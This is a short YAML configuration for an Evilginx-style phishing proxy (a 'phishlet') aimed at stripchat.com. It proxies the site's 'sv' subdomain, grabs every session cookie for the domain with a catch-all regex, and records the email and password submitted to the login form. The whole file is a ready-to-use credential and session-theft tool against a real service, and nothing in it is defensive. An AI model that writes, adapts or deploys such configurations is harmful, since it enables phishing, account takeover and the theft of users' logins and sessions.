author: 'luffy'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'stripchat.com', session: true, is_landing: true, auto_filter: true}

auth_tokens:
  - domain: '.stripchat.com'
    keys: ['.*,regexp']
auth_urls:
  - '/login/.*'
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'    
login:
  domain: 'sv.stripchat.com'
  path: '/'
    